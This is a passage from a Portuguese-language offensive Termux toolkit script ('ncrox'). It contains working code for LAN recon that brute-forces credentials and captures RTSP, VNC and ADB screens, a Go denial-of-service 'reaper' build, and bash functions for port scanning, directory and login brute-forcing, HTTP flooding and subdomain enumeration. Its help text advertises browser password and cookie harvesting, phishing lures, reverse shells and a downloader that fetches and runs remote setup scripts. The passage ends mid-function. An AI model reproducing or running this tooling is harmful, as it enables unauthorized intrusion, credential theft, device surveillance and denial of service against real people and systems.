    ts = [threading.Thread(target=w, daemon=True) for _ in range(12)]
    [t.start() for t in ts]; [t.join() for t in ts]; print()

    hosts.sort(key=lambda x: -x["score"])
    for h in hosts:
        cr = brute(h, a.paranoid)
        if cr:
            h["creds"] = cr; log(f"  {h['ip']} {cr['svc']} {cr['user']}:{cr['pwd']}", "g")
        if h["creds"] and h["creds"]["svc"] == "rtsp":
            p = rtsp_shot(h["ip"], h["creds"]["port"], h["creds"]["user"], h["creds"]["pwd"])
            if p: h["shot"] = p
        elif 554 in h["ports"] and h["score"] >= 25:
            p = rtsp_shot(h["ip"], 554)
            if p: h["shot"] = p
        if 5900 in h["ports"] and vnc_none(h["ip"]):
            p = vnc_capture(h["ip"])
            if p: h["shot"] = p
        if 5555 in h["ports"] or "_adb" in h["mdns"]:
            pt = 5555
            m = re.search(r"porta:(\d+)", h["mdns"])
            if m: pt = int(m.group(1))
            if adb_conn(h["ip"], pt) and adb_ok(h["ip"], pt):
                h["adb"] = adb_info(h["ip"], pt)
                log(f"  ADB {h['ip']}:{pt} {h['adb'].get('modelo')}", "g")
                p = adb_shot(h["ip"], pt)
                if p: h["shot"] = p

    table(hosts)
    j, m = report(hosts, {"net": str(net), "gw": gw})
    log(f"json: {j}", "d"); log(f"leitura: {m}", "d")
    if a.write: log("modo escrita: --snap/--mirror/--tap/--loot", "y")

if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt: print("\ninterrompido.")
PY

  chmod +x "$TOOLS"/*.py
  printf '%s[+]%s ferramentas embutidas gravadas\n' "$G" "$R"
}

# ==========================================================================
#  build do reaper
# ==========================================================================
reap_build() {
  command -v go >/dev/null 2>&1 || { printf '%s[*]%s instalando golang...\n' "$B" "$R"; pkg install -y golang >/dev/null 2>&1 || true; }
  command -v go >/dev/null 2>&1 || { printf '%s[!]%s golang indisponível\n' "$RD" "$R"; return 1; }
  local d="$TOOLS/reaper"; mkdir -p "$d" "$RBIN"
  cp "$TOOLS/reaper.go" "$d/main.go"
  cd "$d" || return 1
  [ -f go.mod ] || go mod init reaper >/dev/null 2>&1
  go get golang.org/x/net/http2 >/dev/null 2>&1
  printf '%s[*]%s compilando...\n' "$B" "$R"
  go build -trimpath -ldflags "-s -w" -o "$RBIN/reaper" . || return 1
  chmod +x "$RBIN/reaper"
  printf '%s[+]%s reaper em %s\n' "$G" "$R" "$RBIN/reaper"
}
````

Segunda parte do arquivo (biblioteca, launchers, tema e instalação):

```bash
write_lib() {
  mkdir -p "$(dirname "$LIB")"
  cat > "$LIB" <<'LIBEOF'
#!/usr/bin/env bash
# ncrox replica lib
NCROX_REPO_DIR="$HOME/.ncrox/src"
WL_DIR="$HOME/.ncrox/wordlists"
HACK_DIR="$HOME/.ncrox/hack"
TMPD="$HOME/.ncrox/tmp"
TOOLS="$HOME/.ncrox/tools"
HACK_REPO="N3CR0-X/ncroxhack"
WL_BASE="https://raw.githubusercontent.com/danielmiessler/SecLists/master"
if [ -t 1 ]; then
  O=$'\e[38;2;255;122;0m'; B=$'\e[38;2;30;144;255m'; D=$'\e[38;2;90;95;107m'
  G=$'\e[38;2;61;220;132m'; RD=$'\e[38;2;255;77;77m'; Y=$'\e[38;2;255;200;0m'; R=$'\e[0m'
else
  O=; B=; D=; G=; RD=; Y=; R=
fi
_hr(){ printf '%s────────────────────────────────────────────%s\n' "$D" "$R"; }
_tag(){ printf '\n%s┌─ %s%s\n%s└%s\n' "$O" "$1" "$R" "$O" "$R"; }

ncx_banner(){
  printf '\n%s _   _  ____ ____   ___  __  __%s\n' "$O" "$R"
  printf '%s| \\ | |/ ___|  _ \\ / _ \\ \\ \\/ /%s\n' "$O" "$R"
  printf '%s|  \\| | |   | |_) | | | | \\  /%s\n' "$O" "$R"
  printf '%s| . ` | |___|  _ <| |_| | /  \\%s\n' "$O" "$R"
  printf '%s|_|\\__|\\____|_| \\_\\\\___//_/\\_\\%s\n' "$O" "$R"
  printf '%ssatanachia · termux edition%s\n' "$B" "$R"
}

ncx_help(){
  _tag "ncrox · comandos"
  cat <<'H'
 AUDITORIA
   vigia <host> [portas]      varredura TCP em host único
   oraculo <dominio>          resolução DNS A/AAAA
   bastiao <host> [porta]     TLS: protocolo, cifra, validação
   selo <arquivo> [sha256]    SHA-256 local e comparação

 REDE / WEB
   dns | whois | net | ip a | search <termo>
   web get|title|links|status|headers <url>
   github repo|user|releases|issues|search <x>
   ondeuto -ip

 OFENSIVO
   ncx-port     <host> [top|all|lista] [-t N] [-b]
   ncx-dir      <url> [-w lista] [-t N] [-x ext]
   ncx-brute    <url> <campo_user> <campo_pass> [-u] [-p] [-s] [-c]
   ncx-flood    <url> [-c conc] [-n req] [-m metodo]
   ncx-sub      <dominio> [-w lista]
   ncx-takeover <dominio> [-w lista] [-t N]
   ncx-crack    <hash> [-w lista] [-r regras] [-t N]
   ncx-phish    <porta> [url_alvo] [-t titulo] [-d destino] [-r template]

 ARSENAL PESADO
   ncx-htx   <cmd>     colheita de navegador, zap silencioso, lure, stego
   ncx-reap  -l        L7 reaper: h2, rapid reset, hpack, syn, slowpost
   ncx-oz    --help    recon ofensivo silencioso em LAN (ARP, ADB, RTSP, VNC)

 REVERSE SHELL
   ncx-rev <lhost> <lport> [-t tipo] [-a] [-u] [-b] [-i] [-l]
   ncx-listen <porta>

 NHACK
   ncrox for hack | nhack list | nhack pick <zip> | nhack -st <zip> | nhack rm <t>

 WORDLISTS
   ncx-wordlists list|update|get <n>|rockyou|clean

 UTILITÁRIOS
   hash | base64 | urlinfo | jsoncheck | comparar | fileinfo | uuid | netcheck
   sysinfo | disk | which | where | findtext | rede | tree | readmd | device
   battery | storage | screen | uptime | locale | timezone | volume | ringer
   say | open | pack | docs | applist | tasklist | settings
H
  _hr
}

# ---------- auditoria ----------
ncx_vigia(){
  local host="${1:-}" ports="${2:-22,80,443,8080}" n=0 p ip
  [ -z "$host" ] && { echo "uso: vigia <host> [porta,porta,...]"; return 1; }
  ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
  _tag "vigia :: $host ($ip)"
  for p in ${ports//,/ }; do
    if timeout 1 bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null; then
      printf '  %s%s/tcp aberta%s\n' "$G" "$p" "$R"; n=$((n+1))
    fi
  done
  _hr; printf 'abertas: %s\n' "$n"
}
ncx_oraculo(){
  local d="${1:-}"; [ -z "$d" ] && { echo "uso: oraculo <dominio>"; return 1; }
  _tag "oraculo :: $d"
  getent hosts "$d" 2>/dev/null || echo "  sem resolução"
  command -v dig >/dev/null && dig +short "$d" 2>/dev/null
  _hr
}
ncx_bastiao(){
  local h="${1:-}" p="${2:-443}"
  [ -z "$h" ] && { echo "uso: bastiao <host> [porta]"; return 1; }
  _tag "bastiao :: $h:$p"
  timeout 8 openssl s_client -connect "$h:$p" -servername "$h" </dev/null 2>&1 \
    | grep -Ei 'verify return code|protocol *:|cipher *:|subject=|issuer=' | sed 's/^/  /'
  _hr
}
ncx_selo(){
  local f="${1:-}" want="${2:-}" got
  [ -f "$f" ] || { echo "uso: selo <arquivo> [sha256]"; return 1; }
  got=$(sha256sum "$f" | awk '{print $1}')
  _tag "selo :: $f"; echo "  $got"
  if [ -n "$want" ]; then
    [ "$got" = "$want" ] && printf '  %sCONFERE%s\n' "$G" "$R" || printf '  %sDIVERGE%s\n' "$RD" "$R"
  fi; _hr
}

# ---------- web ----------
ncx_search(){
  local q="${*:-}"; [ -z "$q" ] && { echo "uso: search <termo>"; return 1; }
  _tag "search :: $q"
  curl -s -m 15 "https://www.bing.com/search?q=${q// /+}&format=rss" \
   | grep -oE '<title>[^<]+</title>|<link>[^<]+</link>' | sed -e 's/<[^>]*>//g' \
   | head -12 | sed 's/^/  /'
  _hr
}
ncx_web(){
  local a="${1:-}" u="${2:-}"
  [ -z "$u" ] && { echo "uso: web get|title|links|status|headers <url>"; return 1; }
  case "$a" in
    get|source) curl -sL -m 20 "$u" | head -c 4000 ;;
    title) curl -sL -m 15 "$u" | grep -oiE '<title>[^<]*' | head -1 | sed 's/<title>//I' ;;
    links) curl -sL -m 15 "$u" | grep -oE 'href="https?://[^"]+' | sed 's/href="//' | sort -u | head -20 ;;
    status) curl -s -o /dev/null -m 15 -w 'status: %{http_code}\n' "$u" ;;
    headers) curl -sI -m 15 "$u" ;;
    open) termux-open-url "$u" 2>/dev/null || echo "$u" ;;
    *) echo "ação inválida" ;;
  esac
}
ncx_dns(){ [ -z "${1:-}" ] && { echo "uso: dns <dominio>"; return 1; }; getent hosts "$1" || echo "sem resolução"; }
ncx_whois(){ [ -z "${1:-}" ] && return 1; curl -s -m 15 "https://rdap.org/domain/$1" | head -c 2500; echo; }
ncx_net(){
  _tag "net"
  ip -o addr 2>/dev/null | awk '{print "  "$2" "$4}' || ifconfig 2>/dev/null | grep -E 'inet |^[a-z]'
  _hr
}
ncx_github(){
  local a="${1:-}" x="${2:-}"
  case "$a" in
    repo) curl -s -m 15 "https://api.github.com/repos/$x" | grep -E '"(full_name|description|stargazers_count|language)"' | head -6 ;;
    user) curl -s -m 15 "https://api.github.com/users/$x" | grep -E '"(login|name|public_repos|followers)"' | head -6 ;;
    releases) curl -s -m 15 "https://api.github.com/repos/$x/releases" | grep -E '"(tag_name|name)"' | head -10 ;;
    issues) curl -s -m 15 "https://api.github.com/repos/$x/issues" | grep -E '"(title|state)"' | head -10 ;;
    search) curl -s -m 15 "https://api.github.com/search/repositories?q=${x// /+}" | grep '"full_name"' | head -10 ;;
    *) echo "uso: github repo|user|releases|issues|search <x>" ;;
  esac
}
ncx_ondeuto(){ curl -s -m 12 https://ipapi.co/json/ | grep -E '"(ip|city|region|country_name|org)"'; }

# ---------- wordlists ----------
wl_catalog(){
  cat <<'C'
common|Discovery/Web-Content/common.txt
raft-dirs|Discovery/Web-Content/raft-small-directories.txt
dir23|Discovery/Web-Content/directory-list-2.3-small.txt
dns5000|Discovery/DNS/subdomains-top1million-5000.txt
namelist|Discovery/DNS/namelist.txt
10k|Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt
pass-short|Passwords/Common-Credentials/top-passwords-shortlist.txt
users|Usernames/top-usernames-shortlist.txt
top1m|Passwords/Common-Credentials/10-million-password-list-top-1000000.txt
C
}
_wl_path(){
  local n="$1"
  [ -f "$n" ] && { printf '%s' "$n"; return 0; }
  [ -f "$WL_DIR/$n.txt.gz" ] && { printf '%s' "$WL_DIR/$n.txt.gz"; return 0; }
  [ -f "$WL_DIR/$n.txt" ] && { printf '%s' "$WL_DIR/$n.txt"; return 0; }
  [ -f "$WL_DIR/$n" ] && { printf '%s' "$WL_DIR/$n"; return 0; }
  return 1
}
_wl_read(){ case "$1" in *.gz) gzip -dc "$1";; *) cat "$1";; esac; }
_wl_get(){
  local n="$1" p="$2" tmp
  mkdir -p "$WL_DIR"; tmp="$WL_DIR/$n.txt"
  if curl -fsSL -m 120 "$WL_BASE/$p" -o "$tmp" 2>/dev/null && [ -s "$tmp" ]; then
    gzip -9 -f "$tmp"
    printf '%s[+]%s %s (%s linhas)\n' "$G" "$R" "$n" "$(gzip -dc "$tmp.gz" | wc -l)"
  else
    rm -f "$tmp"; printf '%s[!]%s %s falhou\n' "$RD" "$R" "$n"
  fi
}
ncx_wordlists(){
  local a="${1:-list}" n p f
  mkdir -p "$WL_DIR"
  case "$a" in
    list)
      _tag "wordlists locais"
      ls -1 "$WL_DIR" 2>/dev/null | sed -e 's/\.txt\.gz$//' -e 's/\.txt$//' | sort -u | sed 's/^/  /'
      [ -z "$(ls -A "$WL_DIR" 2>/dev/null)" ] && echo "  (vazio — ncx-wordlists update)"
      echo; echo "  catálogo: ncx-wordlists catalog"; _hr ;;
    catalog) wl_catalog | sed 's/|/  ->  /' | sed 's/^/  /' ;;
    update) while IFS='|' read -r n p; do _wl_get "$n" "$p"; done < <(wl_catalog); _hr ;;
    get)
      [ -z "${2:-}" ] && { echo "uso: ncx-wordlists get <nome>"; return 1; }
      p=$(wl_catalog | awk -F'|' -v k="$2" '$1==k{print $2}' | head -1)
      [ -z "$p" ] && { echo "nome desconhecido: $2"; return 1; }
      _wl_get "$2" "$p" ;;
    rockyou)
      _tag "rockyou (~130 MB)"
      if curl -fsSL -m 900 "$WL_BASE/Passwords/Leaked-Databases/rockyou.txt.tar.gz" \
           -o "$WL_DIR/rockyou.tar.gz" && tar xzf "$WL_DIR/rockyou.tar.gz" -C "$WL_DIR" \
         && gzip -9 -f "$WL_DIR/rockyou.txt" && rm -f "$WL_DIR/rockyou.tar.gz"; then
        printf '%s[+]%s rockyou pronto\n' "$G" "$R"
      else printf '%s[!]%s falhou (precisa de ~300 MB livres)\n' "$RD" "$R"; fi ;;
    clean) rm -f "$WL_DIR"/*; printf '%s[+]%s wordlists removidas\n' "$G" "$R" ;;
    auto) for n in common dns5000 10k users pass-short; do
            p=$(wl_catalog | awk -F'|' -v k="$n" '$1==k{print $2}' | head -1)
            [ -n "$p" ] && _wl_get "$n" "$p"; done ;;
    *) echo "uso: ncx-wordlists list|update|get <n>|rockyou|clean" ;;
  esac
}

# ---------- nhack ----------
nhack_list(){
  _tag "ncrox for hack :: $HACK_REPO"
  local js out
  js=$(curl -fsS -m 20 "https://api.github.com/repos/$HACK_REPO/contents/" 2>/dev/null) || {
    printf '%s[!]%s repositório sem conteúdo ou inacessível.\n' "$RD" "$R"
    echo "    publique os .zip na raiz de github.com/$HACK_REPO"; return 1; }
  if command -v jq >/dev/null 2>&1; then
    out=$(printf '%s' "$js" | jq -r '.[]? | select(.name|endswith(".zip")) | "\(.name)\t\(.size)"' 2>/dev/null)
  else
    out=$(printf '%s' "$js" | grep -oE '"name": *"[^"]+\.zip"' | sed 's/.*: *"//;s/"//' | sed 's/$/\t0/')
  fi
  if [ -z "$out" ]; then echo "  nenhum .zip publicado ainda"; else
    printf '%s\n' "$out" | while IFS=$'\t' read -r n s; do
      printf '  %s%-36s%s %7s KB\n' "$O" "$n" "$R" "$(( ${s:-0} / 1024 ))"; done
  fi
  echo; echo "  baixar: nhack pick <tool.zip>"; echo "  instalar: nhack -st <tool.zip>"; _hr
}
nhack_search(){ [ -z "${1:-}" ] && { echo "uso: nhack search <termo>"; return 1; }; nhack_list | grep -i -- "$1"; }
nhack_pick(){
  local n="${1:-}"; [ -z "$n" ] && { echo "uso: nhack pick <tool.zip>"; return 1; }
  case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
  case "$n" in */*|*..*) echo "nome inválido"; return 1 ;; esac
  mkdir -p "$HACK_DIR/dl"
  local out="$HACK_DIR/dl/$n" ok=0
  _tag "nhack pick :: $n"
  if curl -fsSL -m 240 "https://raw.githubusercontent.com/$HACK_REPO/main/$n" -o "$out" 2>/dev/null && [ -s "$out" ]; then ok=1
  elif curl -fsSL -m 240 "https://github.com/$HACK_REPO/raw/main/$n" -o "$out" 2>/dev/null && [ -s "$out" ]; then ok=1; fi
  if [ "$ok" = 0 ]; then rm -f "$out"; printf '%s[!]%s não encontrado\n' "$RD" "$R"; return 1; fi
  unzip -tqq "$out" >/dev/null 2>&1 || { printf '%s[!]%s zip corrompido\n' "$RD" "$R"; rm -f "$out"; return 1; }
  printf '%s[+]%s %s (%s KB)\n' "$G" "$R" "$out" "$(( $(stat -c%s "$out") / 1024 ))"
  printf '    sha256: %s\n' "$(sha256sum "$out" | awk '{print $1}')"
  printf '    instalar: nhack -st %s\n' "$n"; _hr
}
nhack_st(){
  local run=1 n=""
  while [ $# -gt 0 ]; do case "$1" in
    --no-run) run=0; shift;; *) n="$1"; shift;; esac; done
  [ -z "$n" ] && { echo "uso: nhack -st <tool.zip> [--no-run]"; return 1; }
  case "$n" in *.zip) ;; *) n="$n.zip" ;; esac
  local zip="$HACK_DIR/dl/$n" tool="${n%.zip}"
  [ -f "$zip" ] || { echo "não baixado: $n — use nhack pick $n"; return 1; }
  [ -d "$HACK_DIR/$tool" ] && { printf '%s[!]%s já instalado (nhack rm %s)\n' "$RD" "$R" "$tool" "$tool"; return 1; }
  unzip -Z1 "$zip" | grep -qE '^/|(^|/)\.\.(/|$)' && { echo "zip com caminho absoluto ou .."; return 1; }
  mkdir -p "$HACK_DIR/env" "$PREFIX/bin"
  local tmp; tmp=$(mktemp -d "$HACK_DIR/.tmp.XXXXXX") || return 1
  unzip -q "$zip" -d "$tmp" || { rm -rf "$tmp"; echo "falha ao extrair"; return 1; }
  local root="$tmp" uniq
  uniq=$(find "$tmp" -mindepth 1 -maxdepth 1 | wc -l)
  if [ "$uniq" = 1 ] && [ -d "$(find "$tmp" -mindepth 1 -maxdepth 1)" ]; then
    root=$(find "$tmp" -mindepth 1 -maxdepth 1)
  fi
  mv "$root" "$HACK_DIR/$tool" || { rm -rf "$tmp"; return 1; }
  rm -rf "$tmp"
  _tag "nhack -st :: $tool"
  local f base tgt linked=0 envs=0 PIP_REQ="" SETUP=""
  while IFS= read -r -d '' f; do
    base=$(basename "$f")
    case "$base" in
      requirements.txt) PIP_REQ="$f"; continue ;;
      install.sh|setup.sh) SETUP="$f"; continue ;;
      *.env|*.conf|*.cfg) cp -f "$f" "$HACK_DIR/env/" 2>/dev/null && envs=$((envs+1)); continue ;;
    esac
    if [ "$(head -c2 "$f" 2>/dev/null)" = '#!' ] || [ -x "$f" ]; then
      chmod +x "$f"
      tgt="$PREFIX/bin/$base"
      [ -e "$tgt" ] && tgt="$PREFIX/bin/${tool}-$base"
      ln -sf "$f" "$tgt" && linked=$((linked+1))
    fi
  done < <(find "$HACK_DIR/$tool" -type f -print0)
  printf '  %s[+]%s %s link(s) · %s env(s) · %s\n' "$G" "$R" "$linked" "$envs" "$HACK_DIR/$tool"
  if [ -n "$PIP_REQ" ]; then
    if python3 -m venv "$HOME/.venvs/nhack-$tool" >/dev/null 2>&1 \
       && "$HOME/.venvs/nhack-$tool/bin/pip" install -q -r "$PIP_REQ"; then
      printf '  %s[+]%s venv: ~/.venvs/nhack-%s\n' "$G" "$R" "$tool"
    else printf '  %s[!]%s pip falhou\n' "$RD" "$R"; fi
  fi
  if [ -n "$SETUP" ] && [ "$run" = 1 ]; then
    printf '  %s[*]%s executando %s\n' "$B" "$R" "$(basename "$SETUP")"
    bash "$SETUP" 2>&1 | tail -30
  fi
  printf '  remover: nhack rm %s\n' "$tool"; _hr
}
nhack_get(){ nhack_pick "${1:-}" || return 1; nhack_st "${1:-}"; }
nhack_installed(){
  _tag "instaladas"
  local d
  for d in "$HACK_DIR"/*/; do [ -d "$d" ] || continue
    case "$d" in */.tmp.*) continue;; esac; printf '  %s\n' "$(basename "$d")"; done
  _hr
}
nhack_rm(){
  local t="${1:-}"; [ -z "$t" ] && { echo "uso: nhack rm <tool>"; return 1; }
  [ -d "$HACK_DIR/$t" ] || { echo "não instalado: $t"; return 1; }
  find "$PREFIX/bin" -maxdepth 1 -type l -lname "$HACK_DIR/$t/*" -delete 2>/dev/null
  rm -rf "$HACK_DIR/$t" "$HOME/.venvs/nhack-$t"
  printf '%s[+]%s removido: %s\n' "$G" "$R" "$t"
}
ncx_nhack(){
  local a="${1:-list}"; shift 2>/dev/null
  case "$a" in
    ""|list|ls|for) nhack_list ;;
    search) nhack_search "$@" ;;
    pick) nhack_pick "$@" ;;
    get) nhack_get "$@" ;;
    -st|--st|st) nhack_st "$@" ;;
    installed|-i) nhack_installed ;;
    rm|remove) nhack_rm "$@" ;;
    -h|--help) echo "uso: nhack list|search <t>|pick <zip>|-st <zip>|get <zip>|installed|rm <t>" ;;
    *) nhack_get "$a" ;;
  esac
}

# ---------- arsenal pesado ----------
ncx_htx(){
  [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ] && {
    _tag "ncx-htx"
    cat <<'H'
  htx.py — colheita real de navegador + zap + lure + stego

  ncx-htx                       sobe painel + túnel público (QR do zap)
  ncx-htx wa                    idem, com pareamento WhatsApp ativo
  ncx-htx --no-tunnel           só local, sem túnel
  ncx-htx --port 9000           porta alternativa
  ncx-htx harvest [all|cdp|root|wa]   colheita pontual
  ncx-htx add <url> [google|instagram|facebook] [stay|watch]
  ncx-htx stego <capa.jpg> <url>       esconde URL após o EOI
  ncx-htx unstego <arquivo.jpg>        extrai

  cdp  = Chrome com depuração (adb) — sessão viva, sem root
  root = /data/data com su ou tsu — cookies e senhas em disco
H
    _hr; return 0; }
  if [ "${1:-}" = "wa" ] && ! command -v node >/dev/null 2>&1; then
    printf '%s[*]%s instalando nodejs para o modo zap...\n' "$B" "$R"; pkg install -y nodejs >/dev/null 2>&1 || true
  fi
  python3 "$TOOLS/htx.py" "$@"
}
ncx_reap(){
  local b="$RBIN/reaper"
  [ -x "$b" ] || { printf '%s[*]%s reaper não compilado\n' "$B" "$R"; reap_build >/dev/null 2>&1 || {
    printf '%s[!]%s build falhou (pkg install golang)\n' "$RD" "$R"; return 1; }; }
  "$b" "$@"
}
ncx_oz(){ python3 "$TOOLS/oztek.py" "$@"; }

# ---------- ofensivo ----------
_portlist(){
  case "$1" in
    all) seq 1 65535 ;;
    top) printf '%s\n' 21 22 23 25 53 80 110 111 135 139 143 161 389 443 445 465 587 636 993 995 \
      1433 1521 1723 2049 2181 3000 3128 3306 3389 4443 5000 5432 5555 5900 5984 6379 7001 7002 \
      8000 8001 8008 8080 8081 8086 8090 8443 8888 9000 9090 9200 9300 10000 11211 27017 ;;
    *) printf '%s\n' "${1//,/ }" ;;
  esac
}
_probe(){
  local ip="$1" p="$2" tmo="$3" grab="$4" b=""
  if timeout "$tmo" bash -c "exec 3<>/dev/tcp/$ip/$p" 2>/dev/null; then
    if [ "$grab" = 1 ]; then
      b=$(timeout 2 bash -c "exec 3<>/dev/tcp/$ip/$p; head -c 120 <&3" 2>/dev/null | tr -c '[:print:]\n' '.' | head -1)
    fi
    printf '%s[+] %s/tcp open%s%s\n' "$O" "$p" "$R" "${b:+  :: $b}"
  fi
}
ncx_port(){
  local host="" ports="top" thr=150 tmo=1 grab=0
  while [ $# -gt 0 ]; do case "$1" in
    -t) thr="${2:-150}"; shift 2;; -w) tmo="${2:-1}"; shift 2;; -b) grab=1; shift;;
    -h|--help) echo "uso: ncx-port <host> [top|all|p1,p2] [-t threads] [-w timeout] [-b]"; return 0;;
    *) [ -z "$host" ] && host="$1" || ports="$1"; shift;; esac; done
  [ -z "$host" ] && { echo "uso: ncx-port <host> [top|all|p1,p2]"; return 1; }
  local ip n=0; ip=$(getent hosts "$host" 2>/dev/null | awk 'NR==1{print $1}'); [ -z "$ip" ] && ip="$host"
  _tag "ncx-port :: $host ($ip) :: $ports :: ${thr} threads"
  while read -r p; do
    [ -z "$p" ] && continue
    _probe "$ip" "$p" "$tmo" "$grab" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done < <(_portlist "$ports")
  wait 2>/dev/null; _hr; echo "concluída"
}
_def_dirs(){ printf '%s\n' admin api backup bin config data db docs download downloads env git \
  includes inc install js lib log logs old panel php phpinfo.php private robots.txt server-status \
  src sql temp test tmp upload uploads user users wp-admin wp-config.php wp-content wp-login.php .git .env; }
ncx_dir(){
  local url="" wl="" thr=30 ext="" codes="200,204,301,302,307,401,403" n=0 w f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; -x) ext="$2"; shift 2;;
    -c) codes="$2"; shift 2;; -h|--help) echo "uso: ncx-dir <url> [-w lista] [-t threads] [-x ext]"; return 0;;
    *) url="$1"; shift;; esac; done
  [ -z "$url" ] && { echo "uso: ncx-dir <url> [-w lista]"; return 1; }
  url="${url%/}"
  _tag "ncx-dir :: $url :: ${thr} threads${wl:+ :: $wl}"
  _dir_one(){
    local u="$1" w="$2" e="$3" codes="$4" out code len
    out=$(curl -s -o /dev/null -m 8 -w '%{http_code} %{size_download}' "$u/$w$e")
    code="${out%% *}"; len="${out##* }"
    case ",$codes," in *",$code,"*) printf '%s[%s]%s %s%s  (%s bytes)\n' "$G" "$code" "$R" "$w" "$e" "$len" ;; esac
  }
  { if [ -n "$wl" ]; then
      if f=$(_wl_path "$wl"); then _wl_read "$f"; else echo "lista não encontrada: $wl" >&2; fi
    else
      if f=$(_wl_path common); then _wl_read "$f"; else _def_dirs; fi
    fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _dir_one "$url" "$w" "${ext:+.$ext}" "$codes" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr; echo "concluído"
}
_def_users(){ printf '%s\n' admin administrator root user teste test guest suporte; }
_def_pass(){ printf '%s\n' 123456 password 12345678 admin admin123 root toor 1234 senha 123456789 \
  qwerty 12345 111111 1234567 123123 000000 1q2w3e4r abc123 iloveyou 654321 monkey dragon \
  senha123 mudar123 P@ssw0rd admin@123 teste123; }
ncx_brute(){
  local url="" uf="" pf="" ul="" pl="" ok="" fail="" okc="" thr=20 n=0 u p f
  while [ $# -gt 0 ]; do case "$1" in
    -u) ul="${2:-}"; shift 2;; -p) pl="${2:-}"; shift 2;; -s) ok="${2:-}"; shift 2;;
    -f) fail="${2:-}"; shift 2;; -c) okc="${2:-}"; shift 2;; -t) thr="${2:-20}"; shift 2;;
    -h|--help) echo "uso: ncx-brute <url> <campo_user> <campo_pass> [-u users] [-p passes] [-s ok] [-c code]"; return 0;;
    *) if [ -z "$url" ]; then url="$1"; elif [ -z "$uf" ]; then uf="$1"; elif [ -z "$pf" ]; then pf="$1"; fi; shift;;
  esac; done
  { [ -z "$url" ] || [ -z "$uf" ] || [ -z "$pf" ]; } && { echo "uso: ncx-brute <url> <campo_user> <campo_pass>"; return 1; }
  _tag "ncx-brute :: $url :: $uf/$pf :: ${thr} threads"
  _brute_one(){
    local url="$1" uf="$2" pf="$3" u="$4" p="$5" ok="$6" fail="$7" okc="$8"
    local out body code len hit=0
    out=$(curl -s -m 12 -w '\n%{http_code} %{size_download}' -d "$uf=$u&$pf=$p" "$url")
    code=$(printf '%s' "$out" | tail -1 | awk '{print $1}'); len=$(printf '%s' "$out" | tail -1 | awk '{print $2}')
    body=$(printf '%s' "$out" | sed '$d')
    [ -n "$okc" ] && [ "$code" = "$okc" ] && hit=1
    [ -n "$ok" ] && printf '%s' "$body" | grep -qiF -- "$ok" && hit=1
    [ -n "$fail" ] && printf '%s' "$body" | grep -qiF -- "$fail" && hit=0
    if [ "$hit" = 1 ]; then
      printf '%s[OK]%s %s : %s   (code %s, %s bytes)\n' "$G" "$R" "$u" "$p" "$code" "$len"
    else
      printf '%s[--]%s %s : %s   (code %s, %s bytes)\n' "$D" "$R" "$u" "$p" "$code" "$len"
    fi
  }
  mkdir -p "$TMPD"
  { if [ -n "$ul" ]; then f=$(_wl_path "$ul") && _wl_read "$f" || _def_users; else
      if f=$(_wl_path users); then _wl_read "$f"; else _def_users; fi; fi; } > "$TMPD/u.$$"
  { if [ -n "$pl" ]; then f=$(_wl_path "$pl") && _wl_read "$f" || _def_pass; else
      if f=$(_wl_path 10k); then _wl_read "$f"; else _def_pass; fi; fi; } > "$TMPD/p.$$"
  while read -r u; do
    [ -z "$u" ] && continue
    while read -r p; do
      [ -z "$p" ] && continue
      _brute_one "$url" "$uf" "$pf" "$u" "$p" "$ok" "$fail" "$okc" &
      n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
    done < "$TMPD/p.$$"
  done < "$TMPD/u.$$"
  wait 2>/dev/null; rm -f "$TMPD/u.$$" "$TMPD/p.$$"
  _hr; echo "concluído"
}
ncx_flood(){
  local url="" conc=50 total=500 m=GET t0 t1 i
  while [ $# -gt 0 ]; do case "$1" in
    -c) conc="$2"; shift 2;; -n) total="$2"; shift 2;; -m) m="$2"; shift 2;;
    -h|--help) echo "uso: ncx-flood <url> [-c conc] [-n total] [-m GET|POST]"; return 0;;
    *) url="$1"; shift;; esac; done
  [ -z "$url" ] && { echo "uso: ncx-flood <url> [-c 50] [-n 500]"; return 1; }
  _tag "ncx-flood :: $url :: $total/$conc"
  t0=$(date +%s.%N)
  for i in $(seq 1 "$total"); do
    curl -s -o /dev/null -m 15 -X "$m" -w '%{http_code}\n' "$url" &
    if [ $((i % conc)) -eq 0 ]; then wait; fi
  done
  wait 2>/dev/null; t1=$(date +%s.%N)
  awk -v t="$t0" -v e="$t1" -v n="$total" 'BEGIN{d=e-t; printf "%.1f req/s em %.2fs\n", n/d, d}'
  _hr
}
_def_sub(){ printf '%s\n' www mail ftp dev api staging admin blog shop cdn vpn portal app teste \
  test beta ns1 ns2 db git jenkins grafana status docs; }
ncx_sub(){
  local dom="" wl="" thr=30 n=0 w f
  while [ $# -gt 0 ]; do case "$1" in
    -w) wl="$2"; shift 2;; -t) thr="$2"; shift 2;; *) dom="$1"; shift;; esac; done
  [ -z "$dom" ] && { echo "uso: ncx-sub <dominio> [-w lista]"; return 1; }
  _tag "ncx-sub :: $dom"
  _sub_one(){ local ip; ip=$(getent hosts "$1.$2" 2>/dev/null | awk 'NR==1{print $1}'); \
    [ -n "$ip" ] && printf '%s[+]%s %s.%s -> %s\n' "$G" "$R" "$1" "$2" "$ip"; }
  { if [ -n "$wl" ]; then f=$(_wl_path "$wl") && _wl_read "$f" || _def_sub; else
      if f=$(_wl_path dns5000); then _wl_read "$f"; else _def_sub; fi; fi; } | while read -r w; do
    [ -z "$w" ] && continue
    _sub_one "$w" "$dom" &
    n=$((n+1)); if [ "$n" -ge "$thr" ]; then wait -n 2>/dev/null; n=$((n-1)); fi
  done
  wait 2>/dev/null; _hr
}
_tk_fp(){
  cat <<'F'
github.io|There isn't a GitHub Pages site here
herokuapp.com|No such app
s3.amazonaws.com|NoSuchBucket
cloudfront.net|Bad request
